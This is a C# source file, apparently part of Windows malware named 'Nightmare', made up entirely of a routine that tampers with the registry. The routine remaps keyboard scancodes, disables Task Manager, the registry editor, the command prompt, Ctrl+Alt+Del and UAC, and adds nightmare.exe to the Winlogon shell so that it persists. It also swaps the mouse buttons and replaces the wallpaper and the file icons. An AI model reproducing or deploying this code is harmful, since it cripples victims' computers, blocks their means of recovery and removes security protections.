using Microsoft.Win32;

namespace Nightmare
{
    public class Regs
    {
        public static void ModifyRegistryKeys()
        {
            byte[] hax_value = { 0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x64,0x0,0x0,0x0,0x0,0x0,0x50,0xe0,0x0,0x0,0x4b,0xe0,
  0x0,0x0,0x4d,0xe0,0x0,0x0,0x48,0xe0,0x0,0x0,0x40,0xe0,0x0,0x0,0x42,0xe0,0x0,0x0,0x3b,0xe0,0x0,0x0,0x3e,0xe0,0x0,
  0x0,0x3c,0xe0,0x0,0x0,0x3f,0xe0,0x0,0x0,0x58,0xe0,0x0,0x0,0x07,0xe0,0x0,0x0,0x41,0xe0,0x0,0x0,0x57,0xe0,0x0,0x0,
  0x43,0xe0,0x0,0x0,0x23,0xe0,0x0,0x0,0x3d,0xe0,0x0e,0x0,0x08,0xe0,0x0,0x0,0x3b,0x0,0x0,0x0,0x44,0x0,0x0,0x0,0x57,
  0x0,0x0,0x0,0x58,0x0,0x0,0x0,0x64,0x0,0x0,0x0,0x65,0x0,0x0,0x0,0x3c,0x0,0x0,0x0,0x3d,0x0,0x0,0x0,0x3e,0x0,
  0x0,0x0,0x3f,0x0,0x0,0x0,0x40,0x0,0x0,0x0,0x41,0x0,0x0,0x0,0x42,0x0,0x0,0x0,0x43,0x0,0x0,0x0,0x28,0x0,0x0,
  0x0,0x0c,0x0,0x0,0x0,0x33,0x0,0x0,0x0,0x34,0x0,0x0,0x0,0x35,0x0,0x0,0x0,0x27,0x0,0x0,0x0,0x1a,0x0,0x0,0x0,
  0x2b,0x0,0x0,0x0,0x1b,0x0,0x0,0x0,0x29,0x0,0x0,0x0,0x0d,0x0,0x0,0x0,0x0b,0x0,0x0,0x0,0x02,0x0,0x0,0x0,0x03,
  0x0,0x0,0x0,0x04,0x0,0x0,0x0,0x05,0x0,0x0,0x0,0x06,0x0,0x0,0x0,0x07,0x0,0x0,0x0,0x08,0x0,0x0,0x0,0x09,0x0,
  0x0,0x0,0x0a,0x0,0x0,0x0,0x1e,0x0,0x0,0x0,0x30,0x0,0x0,0x0,0x2e,0x0,0x0,0x0,0x20,0x0,0x0,0x0,0x21,0x0,0x0,
  0x0,0x22,0x0,0x0,0x0,0x23,0x0,0x0,0x0,0x24,0x0,0x0,0x0,0x32,0x0,0x0,0x0,0x19,0x0,0x0,0x0,0x10,0x0,0x0,0x0,
  0x13,0x0,0x0,0x0,0x14,0x0,0x0,0x0,0x16,0x0,0x0,0x0,0x11,0x0,0x0,0x0,0x2d,0x0,0x0,0x0,0x52,0x0,0x0,0x0,0x4f,
  0x0,0x0,0x0,0x50,0x0,0x0,0x0,0x51,0x0,0x0,0x0,0x4b,0x0,0x0,0x0,0x4c,0x0,0x0,0x0,0x4d,0x0,0x0,0x0,0x47,0x0,
  0x0,0x0,0x48,0x0,0x0,0x0,0x49,0x0,0x0,0x0,0x46,0xe0,0x0,0x0,0x3a,0x0,0x0,0x0,0x53,0xe0,0x0,0x0,0x4f,0xe0,0x0,
  0x0,0x01,0x0,0x0,0x0,0x47,0xe0,0x0,0x0,0x52,0xe0,0x0,0x0,0x38,0x0,0x0,0x0,0x1d,0x0,0x0,0x0,0x2a,0x0,0x0,0x0,
  0x5b,0xe0,0x0,0x0,0x45,0x0,0x0,0x0,0x51,0xe0,0x0,0x0,0x49,0xe0,0x0,0x0,0x38,0xe0,0x0,0x0,0x1d,0xe0,0x0,0x0,0x36,
  0x0,0x0,0x0,0x5c,0xe0,0x0,0x0,0x5f,0xe0,0x0,0x0,0x0f,0x0,0x0,0x0,0x0,0x0 };
            RegistryKey reg_scancode = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout");
            reg_scancode.SetValue("Scancode Map", hax_value, RegistryValueKind.Binary);
            RegistryKey reg_task = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg_task.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            reg_task.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            RegistryKey reg_explo = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg_explo.SetValue("Shell", "explorer.exe, nightmare.exe", RegistryValueKind.String);
            RegistryKey reg_color = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            reg_color.SetValue("AutoColorization", 1, RegistryValueKind.DWord);
            reg_color.SetValue("WallPaper", @"C:\ProgramData\Microsoft\User Account Pictures\background.jpg", RegistryValueKind.String);
            RegistryKey reg_swap = Registry.CurrentUser.CreateSubKey("Control Panel\\Mouse");
            reg_swap.SetValue("SwapMouseButtons", "1", RegistryValueKind.String);
            RegistryKey reg_cmd = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
            reg_cmd.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            RegistryKey reg_logon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg_logon.SetValue("shutdownwithoutlogon", 0, RegistryValueKind.DWord);
            RegistryKey reg_title = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            reg_title.SetValue("UseDefaultTile", 1, RegistryValueKind.DWord);
            RegistryKey reg_dlogon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
            reg_dlogon.SetValue("DisableLogonBackgroundImage", 1, RegistryValueKind.DWord);
            RegistryKey reg_winlogon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg_winlogon.SetValue("AutoRestartShell", 0, RegistryValueKind.DWord);
            reg_winlogon.SetValue("DisableCAD", 1, RegistryValueKind.DWord);
            RegistryKey reg_uac = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg_uac.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            RegistryKey reg_notepad = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Notepad");
            reg_notepad.SetValue("iPointSize", 200, RegistryValueKind.DWord);
            RegistryKey reg_ico = Registry.ClassesRoot.CreateSubKey("Unknown\\DefaultIcon");
            reg_ico.SetValue("", @"C:\ProgramData\Microsoft\User Account Pictures\kill.ico", RegistryValueKind.String);
            reg_task.Close(); reg_explo.Close(); reg_color.Close(); reg_swap.Close(); reg_cmd.Close();
            reg_logon.Close(); reg_title.Close(); reg_dlogon.Close(); reg_winlogon.Close(); reg_uac.Close();
            reg_notepad.Close(); reg_ico.Close(); reg_scancode.Close();
        }
    }
}